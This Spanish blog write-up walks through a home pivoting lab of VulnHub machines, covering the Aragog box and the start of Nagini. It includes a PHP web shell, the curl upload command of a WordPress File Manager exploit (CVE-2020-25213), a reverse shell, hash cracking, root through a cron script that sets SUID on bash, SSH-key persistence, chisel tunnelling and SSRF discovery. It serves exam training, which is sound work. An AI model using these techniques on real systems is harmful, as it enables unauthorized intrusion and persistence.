---
title: VH - Simulación Examen eCPPTv2 ( Pivoting Lab )
published: true
categories: [Linux]
tags: [eCPPTv2, eWPT, eWPTXv2, eCPTXv2, eCPTXv2, OSWE, OSCP, Pivoting, Buffer Overflow, Fácil, Media]
---

<img src="/assets/VH/eCPPTv2-Lab/unknown.png">

¡Hola!
En este laboratorio hemos configurado 6 máquinas y 4 redes internas para pivotar hasta la máquina Brainpan. Las máquinas de las que consta el lab son las siguientes:

- [Aragog](https://www.vulnhub.com/entry/harrypotter-aragog-102,688/)
- [Nagini](https://www.vulnhub.com/entry/harrypotter-nagini,689/)
- [Fawkes](https://www.vulnhub.com/entry/harrypotter-fawkes,686/)
- [Dumbledore](https://archive.org/details/Windows7Professional64Bit)
- [Matrix: 1](https://www.vulnhub.com/entry/matrix-1,259/)
- [Brainpan](https://www.vulnhub.com/entry/brainpan-1,51/)

La máquina `Dumbledore` es un Windows 7 x64 vulnerable a Eternal Blue.

Este laboratorio fue montado por nuestro querido profesor Marcelo Vázquez aka S4vitar y la resolución del mismo la tienes en formato vídeo en [Youtube](https://www.youtube.com/watch?v=Q7UeWILja-g&t=22892s)

### Preparación Entorno

* * *

Antes de iniciar la fase de enumeración y reconocimiento procederemos a crear un directorio de trabajo con el nombre `Aragog`. Una vez creado accedemos al directorio y con la ayuda de la función que tenemos definida en la zshrc `mkt` crearemos cuatro directorios de trabajo `nmap, content, exploits y scripts` donde almacenaremos de una manera ordenada toda la información que vayamos recopilando de la máquina en función de su naturaleza.

```bash
function mkt(){
    mkdir {nmap,content,exploits,scripts}
}
```

### Reconocimiento (Aragog)

* * *

Técnicas Vistas (Aragog): 

- **WordPress Enumeration + Virtual Hosting**
- **Using wpscan + API TOKEN for vulnerability discovery in wordpress**
- **File Manager WordPress Plugin Exploitation - Unauthenticated Arbitrary File Upload leading to RCE**
- **Uploading a web shell to the server**
- **Enumerating the Apache web server directory structure**
- **MYSQL Database Enumeration**
- **Cracking Hashes + Password reuse**
- **Abusing Cron Job [Privilege Escalation]**
- **EXTRA: Creation of bash script to discover computers on the internal network**
- **EXTRA: Creation of a bash script to discover the open ports of the computers discovered in the internal network**

Primero de todo necesitamos saber la IP de la máquina víctima que se encuentra funcionando dentro de nuestra red local. Procedemos a escanear todos los equipos de nuestra red local

```bash
❯ arp-scan -I ens33 --localnet
Interface: ens33, type: EN10MB, MAC: 00:0c:29:8d:05:79, IPv4: 192.168.1.148
Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.1.1	e4:ca:12:8c:78:a5	zte corporation
192.168.1.128	d0:c2:4e:53:17:09	(Unknown)
192.168.1.129	2c:f0:5d:0a:0a:f1	(Unknown)
192.168.1.135	b8:bc:5b:e8:00:67	Samsung Electronics Co.,Ltd
192.168.1.134	9c:20:7b:b1:3e:47	Apple, Inc.
192.168.1.137	f4:34:f0:50:7e:76	(Unknown)
192.168.1.142	00:0c:29:f9:93:01	VMware, Inc.
192.168.1.138	00:55:da:56:56:66	IEEE Registration Authority
```
Tras analizar la respuesta del escaneo observamos por el **OUI (Organizationally unique identifier)** 00:0c:29 que corresponde a VMWare Inc ya que la máquina víctima funciona bajo un entorno de virtualización VMWare por lo que su IP es `192.168.1.142`

Accedemos al directorio de trabajo `nmap` e iniciamos nuestra fase de reconocimiento realizando un `ping` a la IP de la máquina para comprobar que esté activa y detectamos su sistema operativo basándonos en el `ttl` de una traza **ICMP**.

```ruby
❯ ping -c 1 192.168.1.142
PING 192.168.1.142 (192.168.1.142) 56(84) bytes of data.
64 bytes from 192.168.1.142: icmp_seq=1 ttl=64 time=42.3 ms

--- 1192.168.1.142 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 42.314/42.314/42.314/0.000 ms
```
Identificamos que es una maquina **Linux** debido a su ttl (time to live) correspondiente a 64.

* TTL => 64 Linux
* TTL => 128 Windows

Continuamos con la enumeración de los **65535** puertos en la máquina.

```ruby
nmap -p- --open --min-rate 5000 -vvv -n -Pn 192.168.1.142 -oG allPorts

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
```
Luego de identificar los puertos abiertos `OPEN`, se procede a escanear servicios y versiones que puedan estar corriendo en los puertos abiertos detectados.

```ruby
nmap -sCV -p22,80 192.168.1.142 -oN targeted

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 48df48372594c4746b2c6273bfb49fa9 (RSA)
|   256 1e3418175e17958f702f80a6d5b4173e (ECDSA)
|_  256 3e795f55553b127596b43ee3837a5494 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.38 (Debian)
MAC Address: 00:0C:29:F9:93:01 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Reconocimiento Web (Aragog)

* * *

Iniciamos el reconocimiento del servicio web con la herramienta `whatweb` la cual nos muestra información sobre las tecnologías web que incluyen sistemas de gestión de contenido (CMS), plataformas de blogs, paquetes de estadísticas / análisis, bibliotecas JavaScript, servidores web y dispositivos integrados.

```bash
❯ whatweb http://192.168.1.142
http://192.168.1.142 [200 OK] Apache[2.4.38], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.38 (Debian)], IP[192.168.1.142]
```

Accedemos al servicio http y observamos una imagen estática con temática de Harry Potter

<img src="/assets/VH/eCPPTv2-Lab/aragogweb.png">

Seguimos aplicando fuzzing con la herramienta `Wfuzz` para descubrir posibles directorios

```bash
❯ wfuzz -c --hc=404 -t 200 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt "http://192.168.1.142/FUZZ"
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.1.142/FUZZ
Total requests: 220546

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                       
=====================================================================

000000018:   301        9 L      28 W       313 Ch      "blog"
```

Encontramos un direcotorio `blog`. Accedemos y descubrimos un Wordpress el cual no se ve bien. Inspeccionamos el código fuente y vemos que los recursos apuntan a un subdominio `wordpress.aragog.hogwarts`, añadimos a nuestro `/etc/hosts` para su correcta visualización

```bash
❯ cat /etc/hosts
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: /etc/hosts
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ # Host addresses
   2   │ 127.0.0.1  localhost
   3   │ 127.0.1.1  parrot
   4   │ ::1        localhost ip6-localhost ip6-loopback
   5   │ ff02::1    ip6-allnodes
   6   │ ff02::2    ip6-allrouters
   7   │ # Others
   8   │ 
   9   │ 192.168.1.142 wordpress.aragog.hogwarts
  10   │ 
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Ya nos cargan los recursos correctamente

<img src="/assets/VH/eCPPTv2-Lab/wordpressaragog.png">

### Enumeración Wordpress (Aragog)

* * *

Comenzamos la enumeración de Wordpress con la ayuda de la herramienta `wpscan` con la que trataremos de enumerar plugins instalados, usuarios, etc.

```bash
❯ wpscan --url http://192.168.1.142/blog/ --enumerate vp --plugins-detection aggressive --api-token $APIKEY --force
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` |  _ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.1.142/blog/ [192.168.1.142]
[+] Started: Sun Feb 12 11:55:23 2023

Interesting Finding(s):
.
.
.
[+] wp-file-manager
 | Location: http://192.168.1.142/blog/wp-content/plugins/wp-file-manager/
 | Last Updated: 2023-02-08T10:32:00.000Z
 | Readme: http://192.168.1.142/blog/wp-content/plugins/wp-file-manager/readme.txt
 | [!] The version is out of date, the latest version is 7.1.8
 .
 .
 .
 | [!] Title: File Manager 6.0-6.9 - Unauthenticated Arbitrary File Upload leading to RCE
 |     Fixed in: 6.9
 |     References:
 |      - https://wpscan.com/vulnerability/e528ae38-72f0-49ff-9878-922eff59ace9
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-25213
 |      - https://blog.nintechnet.com/critical-zero-day-vulnerability-fixed-in-wordpress-file-manager-700000-installations/
 |      - https://www.wordfence.com/blog/2020/09/700000-wordpress-users-affected-by-zero-day-vulnerability-in-file-manager-plugin/
 |      - https://seravo.com/blog/0-day-vulnerability-in-wp-file-manager/
 |      - https://blog.sucuri.net/2020/09/critical-vulnerability-file-manager-affecting-700k-wordpress-websites.html
 |      - https://twitter.com/w4fz5uck5/status/1298402173554958338
```

Localizamos el plugin `File Manager` el cual es vulnerable al CVE-2020-25213 que nos puede llevar a un RCE. Buscando en Google localizamos el repositorio de [mansoor123](https://github.com/mansoorr123/wp-file-manager-CVE-2020-25213). Nos lo clonamos en nuestro equipo y verificamos que sea vulnerable

```bash
❯ ./wp-file-manager-exploit.sh --wp_url http://wordpress.aragog.hogwarts/blog --check

============================================================================================
wp-file-manager wordpress plugin Unauthenticated RCE Exploit    By: Mansoor R (@time4ster)
============================================================================================

[+] Found wp-file-manager version: 6.0
[+] Version appears to be vulnerable
[+] Target: http://wordpress.aragog.hogwarts/blog is vulnerable
```

En este punto creamos un archivo `shell.php` el cual nos otorgará la capacidad de ejecución remota de comandos

```bash
❯ cat shell.php
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: shell.php
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ <?php
   2   │     echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>"
   3   │ ?>
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Ahora con la ayuda del exploit descargado lo subimos a la máquina víctima. El propio script nos revela la ruta a la que ha subido nuestro archivo shell.php

```bash
❯ ./wp-file-manager-exploit.sh --wp_url http://wordpress.aragog.hogwarts/blog -f /home/yorch/Labs/VulnHub/Aragog/exploits/shell.php --verbose

============================================================================================
wp-file-manager wordpress plugin Unauthenticated RCE Exploit    By: Mansoor R (@time4ster)
============================================================================================

curl POC :
curl -ks --max-time 5 --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36" -F "reqid=17457a1fe6959" -F "cmd=upload" -F "target=l1_Lw"  -F "mtime[]=1576045135" -F "upload[]=@//home/yorch/Labs/VulnHub/Aragog/exploits/shell.php" "http://wordpress.aragog.hogwarts/blog/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php" 

[+] W00t! W00t! File uploaded successfully.
Location:  /blog/wp-content/plugins/wp-file-manager/lib/php/../files/shell.php 
```

Confirmamos que tengamos capacidad de RCE

<img src="/assets/VH/eCPPTv2-Lab/aragogrce.png">

En este punto sólo tenemos que ponernos en escucha en el puerto 443 y ejecutar onliner para entablar una reverse shell con la máquina víctima

<img src="/assets/VH/eCPPTv2-Lab/shellaragog.png">

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [192.168.1.148] from (UNKNOWN) [192.168.1.142] 41128
bash: cannot set terminal process group (620): Inappropriate ioctl for device
bash: no job control in this shell
bash-5.0$ whoami
whoami
www-data
```

Hemos ganado acceso a la máquina víctima como `www-data`

### Movimiento Lateral (Aragog)

* * *

Enumerando archivos de wordpress localizamos `config-default.php` en la ruta `/etc/wordpress` el cual almacena unas credenciales para MySQL

```bash
bash-5.0$ cat config-default.php 
<?php
define('DB_NAME', 'wordpress');
define('DB_USER', 'root');
define('DB_PASSWORD', 'mySecr3tPass');
define('DB_HOST', 'localhost');
define('DB_COLLATE', 'utf8_general_ci');
define('WP_CONTENT_DIR', '/usr/share/wordpress/wp-content');
?>
```

Accedemos a la base de datos y enumeramos tablas y columnas en busca de información útil

```bash
bash-5.0$ mysql -uroot -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 28
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| wordpress          |
+--------------------+
4 rows in set (0.002 sec)

MariaDB [(none)]> use wordpress;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [wordpress]> show tables;
+-----------------------+
| Tables_in_wordpress   |
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_termmeta           |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
| wp_wpfm_backup        |
+-----------------------+
13 rows in set (0.000 sec)

MariaDB [wordpress]> select * from wp_users;
+----+------------+------------------------------------+---------------+--------------------------+----------+---------------------+---------------------+-------------+--------------+
| ID | user_login | user_pass                          | user_nicename | user_email               | user_url | user_registered     | user_activation_key | user_status | display_name |
+----+------------+------------------------------------+---------------+--------------------------+----------+---------------------+---------------------+-------------+--------------+
|  1 | hagrid98   | $P$BYdTic1NGSb8hJbpVEMiJaAiNJDHtc. | wp-admin      | hagrid98@localhost.local |          | 2021-03-31 14:21:02 |                     |           0 | WP-Admin     |
+----+------------+------------------------------------+---------------+--------------------------+----------+---------------------+---------------------+-------------+--------------+
1 row in set (0.000 sec)
```

Encontramos la contraseña hasheada del usuario `hagrid98`. Con la ayuda de la herramienta `john` procedemos a romper la contraseña

```bash
❯ john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])
No password hashes left to crack (see FAQ)
 john hash --show
?:password123

1 password hash cracked, 0 left
```

Probamos por si hay reutilización de contraseñas y logramos migrar al usuario `hagrid98`. La flag la encontramos en su directorio personal

```bash
bash-5.0$ su hagrid98
Password: 
bash-5.0$ whoami
hagrid98
bash-5.0$ cat /home/hagrid98/horcrux1.txt 
horcrux_{MTogUmlkRGxFJ3MgRGlBcnkgZEVzdHJvWWVkIEJ5IGhhUnJ5IGluIGNoYU1iRXIgb2YgU2VDcmV0cw==}
bash-5.0$ echo "MTogUmlkRGxFJ3MgRGlBcnkgZEVzdHJvWWVkIEJ5IGhhUnJ5IGluIGNoYU1iRXIgb2YgU2VDcmV0cw==" | base64 -d;echo
1: RidDlE s DiAry dEstroYed By haRry in chaMbEr of SeCrets
```

### Escalada de Privilegios (Aragog)

* * *

Enumerando grupos y privilegios de sudo del usuario hagrid98 no encontramos nada interesante. Con la herramienta [pspy](https://github.com/DominicBreuker/pspy) monitorizamos los procesos que se están ejecutando y vemos uno interesante llamado `.backup.sh`

```bash
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
.
.
.
2023/02/12 17:02:01 CMD: UID=0     PID=15878  | /bin/sh -c bash -c "/opt/.backup.sh" 
2023/02/12 17:02:01 CMD: UID=0     PID=15879  | /bin/bash /opt/.backup.sh 
2023/02/12 17:02:01 CMD: UID=0     PID=15880  | /bin/bash /opt/.backup.sh
```

Listamos contenido de la carpeta `/opt` y vemos que el propietario del archivo es el usuario `hagrid98` en el cual podemos el permiso de lectura, escritura y ejecución. La herramienta pspy nos reveló que el script lo ejecuta el UID=0 que pertenece a `root` por lo que el contenido del script se ejecutará con privilegios de root a todos los efectos. Modificamos el script para dar permisos SUID a la bash

```bash
bash-5.0$ ls -la
total 12
drwxr-xr-x  2 root     root     4096 Apr  1  2021 .
drwxr-xr-x 18 root     root     4096 Mar 31  2021 ..
-rwxr-xr-x  1 hagrid98 hagrid98   32 Feb 12 17:17 .backup.sh
bash-5.0$ cat .backup.sh 
#!/bin/bash
chmod u+s /bin/bash
bash-5.0$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash
```

Con los permisos cambiados de la bash podemos con el comando `bash -p` tener una bash con privilegios de root. La falg la localizamos en el directorio `/root`

```bash
bash-5.0$ bash -p
bash-5.0# whoami
root
bash-5.0# cat /root/horcrux2.txt 
  ____                            _         _       _   _                 
 / ___|___  _ __   __ _ _ __ __ _| |_ _   _| | __ _| |_(_) ___  _ __  ___ 
| |   / _ \| '_ \ / _` | '__/ _` | __| | | | |/ _` | __| |/ _ \|  _ \/ __|
| |__| (_) | | | | (_| | | | (_| | |_| |_| | | (_| | |_| | (_) | | | \__ \
 \____\___/|_| |_|\__, |_|  \__,_|\__|\__,_|_|\__,_|\__|_|\___/|_| |_|___/
                  |___/                                                   


Machine Author: Mansoor R (@time4ster)
Machine Difficulty: Easy
Machine Name: Aragog 
Horcruxes Hidden in this VM: 2 horcruxes

You have successfully pwned Aragog machine.
Here is your second hocrux: horcrux_{MjogbWFSdm9MbyBHYVVudCdzIHJpTmcgZGVTdHJPeWVkIGJZIERVbWJsZWRPcmU=}

# For any queries/suggestions feel free to ping me at email: time4ster@protonmail.com

bash-5.0# echo "MjogbWFSdm9MbyBHYVVudCdzIHJpTmcgZGVTdHJPeWVkIGJZIERVbWJsZWRPcmU=" | base64 -d; echo
2: maRvoLo GaUnt's riNg deStrOyed bY DUmbledOre
```

Hemos completado la máquina **Aragog** de VulnHub!!

Antes de pasar al reconocimiento de la máquina `Nagini` vamos a ganar persistencia en la máquina `Aragog`. Para ello crearemos un par de claves en nuestra máquina y copiaremos el contenido de la clave `id_rsa.pub` a un archivo `authorized_keys` en el directorio `.ssh` del usuario root de la máquina `Aragog`

```bash
#ARAGOG
bash-5.0# cd /root/.ssh
bash-5.0# cat authorized_keys 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCamnPQmJjFRNzeZdJHbPkA3jDpmCz2ynK6i+ZSPAf9NkYnS8wGGOIv38C8tejYbdH5xOPEUsTS/
.
.
+sWs6roxr9NuXbtouBW9TTRBpZ941uIvjlHQ1HMI16O99QxAyRC5Or2cS31fopySBP9YXsy2wUHBk4qPWzhSJx7sGOaYBRkPAvDRGFL314kCgB/xPUEVu440= root@parrot

#ATACANTE
❯ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /root/.ssh/id_rsa
Your public key has been saved in /root/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:k5T2jjFYwak9E6HQGEiYH41GsRmAPrMetsID3/J1kPw root@parrot
The key's randomart image is:
+---[RSA 3072]----+
|o*==o+ .oo       |
|+ =+o...+o       |
|.oo.  .o=.       |
| +.  ..*+o       |
|  +   = So.      |
|.+     o *       |
|=.o.  . E .      |
|.=o .. .         |
|. .o.            |
+----[SHA256]-----+
❯ cat id_rsa.pub | xclip -sel clip
```

De esta manera nos podemos conectar directamente por ssh como usuario root en la máquina `Aragog` sin proporcionar contraseña

```bash
❯ ssh root@192.168.1.142
The authenticity of host '192.168.1.142 (192.168.1.142)' can t be established.
ECDSA key fingerprint is SHA256:Xy+Xj3BR8BLS4rk/l2jfAZmSh0d3m5zJXaB5QsUT3AA.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.1.142' (ECDSA) to the list of known hosts.
Linux Aragog 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
```

### Reconocimiento (Nagini)

* * *

Técnicas Vistas (Nagini): 

- **EXTRA: Remote Port Forwarding - Playing with Chisel (From Aragog)**
- **EXTRA: Socks5 connection with Chisel (Pivoting) (From Aragog)**
- **EXTRA: FoxyProxy + Socks5 Tunnel**
- **EXTRA: Fuzzing with gobuster through a Socks5 Proxy**
- **EXTRA: Port scanning with nmap through proxychains**
- **HTTP3 Enumeration - Quiche Installation**
- **Server Side Request Forgery (SSRF)**
- **EXTRA: Playing with socat to reach our web server by going through an intermediate machine**
- **Joomla Enumeration - Joomscan**
- **Joomla Enumeration - Readable config file is found**
- **SSRF + MYSQL Enumeration through gopher link - Gopherus**
- **Changing the Joomla administrator user password via Gopherus and SSRF**
- **Joomla Exploitation - Abusing available templates**
- **EXTRA: Joomla Exploitation - Reverse shell passing through an intermediary machine using socat**
- **Information Leakage**
- **Abusing SUID Binary (User Pivoting)**
- **Getting stored Firefox credentials - Firepwd [Privilege Escalation]**
- **EXTRA: Creation of bash script to discover computers on the internal network**
- **EXTRA: Creation of a bash script to discover the open ports of the computers discovered in the internal network**

Iniciamos el reconocimiento de la máquina `Nagini`. Necesitamos saber su IP y los puertos abiertos que tiene esta máquina. Para ello nos haremos un pequeño script en bash el cual nos ayudará con la tarea. Sabiendo que la IP de la máquina Aragog en el segmento es 10.10.0.134 vamos a escanear todas las IP en el segmento `10.10.0.0/24`

```bash
root@Aragog:/tmp# hostname -I
10.10.0.134 192.168.1.142 fd89:c343:c759:42dc:20c:29ff:fef9:9301 
```

```bash
#!/bin/bash

for i in $(seq 1 254); do
        timeout 1 bash -c "ping -c 1 10.10.0.$i" &>/dev/null && echo "[+] Host 10.10.0.$i - ACTIVO" &
done; wait
```
```bash
root@Aragog:/tmp# ./hostDiscovery.sh 
[+] Host 10.10.0.1 - ACTIVO
[+] Host 10.10.0.135 - ACTIVO
[+] Host 10.10.0.134 - ACTIVO
```
Ya sabemos que la IP de la máquina `Nagini` es la 10.10.0.135. Ahora procedemos a enumerar los puertos abiertos mediante otro script en bash

```bash
#!/bin/bash

for port in $(seq 1 65535); do
        timeout 1 bash -c "echo '' > /dev/tcp/10.10.0.135/$port" 2>/dev/null && echo "[+] Port $port - OPEN" &
done; wait
```

```bash
root@Aragog:/tmp# ./portDiscovery.sh 
[+] Port 22 - OPEN
[+] Port 80 - OPEN
```
A partir de este punto para trabajar más cómodamente vamos a crear un túnel por el cual nos vamos a poder acceder a la máquina `Nagini` desde nuestra equipo atacante a pesar de no tener conexión directa al no estar en el mismo segmento. Para esta tarea utilizaremos la herarmienta `chisel` la cual debemos subir a la máquina `Aragog` que es la que está en el mismo segmento que la `Nagini`. Los ejecutaremos de la siguiente forma

```bash
#Atacante
❯ ./chisel server --reverse -p 1234
2023/02/12 13:58:24 server: Reverse tunnelling enabled
2023/02/12 13:58:24 server: Fingerprint pMQdcAI4+jU1Om0DwremTsYRz0u2taTbT4/Svd29bDs=
2023/02/12 13:58:24 server: Listening on http://0.0.0.0:1234
2023/02/12 13:58:46 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

```bash
#Aragog
root@Aragog:/tmp# ./chisel client 192.168.1.148:1234 R:socks
```
Añadimos al firefox una regla en el add-on Foxy proxy de la siguiente forma y ya podemos acceder por el navegador directamente a la máquina `Nagini` por el puerto 80

<img src="/assets/VH/eCPPTv2-Lab/naginiweb.png">

Continuamos con la enumeración de los **500** puertos más comunes en la máquina.

```ruby
❯ proxychains nmap -p- --top-ports 500 --open -T5 -v -n -sT -Pn 10.10.0.135 2>&1 -oG allPorts | grep -vE "timeout|OK"

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
Luego de identificar los puertos abiertos `OPEN`, se procede a escanear servicios y versiones que puedan estar corriendo en los puertos abiertos detectados.

```ruby
proxychains nmap -sT -Pn -sCV -p22,80 10.10.0.135 -oN targeted

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 48df48372594c4746b2c6273bfb49fa9 (RSA)
|   256 1e3418175e17958f702f80a6d5b4173e (ECDSA)
|_  256 3e795f55553b127596b43ee3837a5494 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Reconocimiento Web (Nagini)

* * *

```bash
❯ gobuster dir -u http://10.10.0.135/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 --proxy socks5://127.0.0.1:1080
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.0.135/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] Proxy:                   socks5://127.0.0.1:1080
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/02/12 14:19:12 Starting gobuster in directory enumeration mode
===============================================================
/joomla               (Status: 301) [Size: 311] [--> http://10.10.0.135/joomla/]
/note.txt             (Status: 200) [Size: 234] 
```
Encontramos un directorio `Joomla` y un archivo `note.txt`. Observamos el contenido del archivo y parece que el servidor está usando protocolo HTTP3 que no está soportado por nuestro navegador

<img src="/assets/VH/eCPPTv2-Lab/note.png">

El protocolo HTTP/3 es la nueva versión del protocolo de transferencia de hipertexto (HTTP) y está basado en el protocolo UDP. por ello deberemos modificar el túnel creado para traernos a nuestro equipo el puerto 443 por UDP

```bash
#ARAGOG
root@Aragog:/tmp# ./chisel client 192.168.1.148:1234 R:socks R:443:10.10.0.135:443/udp
```

Buscando por internet encontramos el repositorio de Cloudfare [Quiche](https://github.com/cloudflare/quiche) con el que podremos realizar peticiones con el protocolo QUIC. Para instalar la herramienta debemos seguir la siguientes instrucciones:

<img src="/assets/VH/eCPPTv2-Lab/quiche.png">

Puede haber algún conflicto con el paquete de Rust preinstalado. Para ello debemos borrarlo e instalar la útlima versión estbalde de Rust usando [rustup](https://rustup.rs/)

Nos dirigimos al directorio `/quiche/target/debug/examples` y con la herramienta `http3-client` podemos hacer una petición a `htps://localhost`. Al haber modificado anteriormente el túnel creado con chisel estamos haciendo la petición a la máquina Nagini en el puerto 443 por UDP

```bash
❯ ./http3-client https://localhost
<html>
	<head>
	<title>Information Page</title>
	</head>
	<body>
		Greetings Developers!!
		
		I am having two announcements that I need to share with you:

		1. We no longer require functionality at /internalResourceFeTcher.php in our main production servers.So I will be removing the same by this week.
		2. All developers are requested not to put any configuration s backup file (.bak) in main production servers as they are readable by every one.


		Regards,
		site_admin
	</body>
</html>
```
En la respuesta observamos que nos revelan una ruta `/internalResourceFeTcher.php`. Comprobamos que aún está operativa. también vemos que nos dan una pista sobre posibles archivos `.bak` que puedan haber

<img src="/assets/VH/eCPPTv2-Lab/fetcher.png">

Observando el código fuente de la página vemos que el valor del input debe ser una url. Introducimos `127.0.0.1` y nos muestra la imagen que hay en el puerto 80 de la máquina Nagini por lo que confirmamos que se acontece un [SSRF](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery)

<img src="/assets/VH/eCPPTv2-Lab/ssrf.png">

### Enumeración Joomla (Nagini)

* * *

Para el enumeración del CMS joomla nos vamos a apoyar de la herramienta [JoomScan](https://github.com/OWASP/joomscan)

```bash
> proxychains perl joomscan.pl -u http://10.10.0.135/joomla/ 2>/dev/null

    ____  _____  _____  __  __  ___   ___    __    _  _ 
   (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )
  .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  ( 
  \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)
			(1337.today)
   
    --=[OWASP JoomScan
    +---++---==[Version : 0.0.7
    +---++---==[Update Date : [2018/09/23]
    +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo
    --=[Code name : Self Challenge
    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP

Processing http://10.10.0.135/joomla/ ...
.
.
.
[+] admin finder
[++] Admin page : http://10.10.0.135/joomla/administrator/
.
.
[+] Checking sensitive config.php.x file
[++] Readable config file is found 
 config file path : http://10.10.0.135/joomla/configuration.php.bak
```

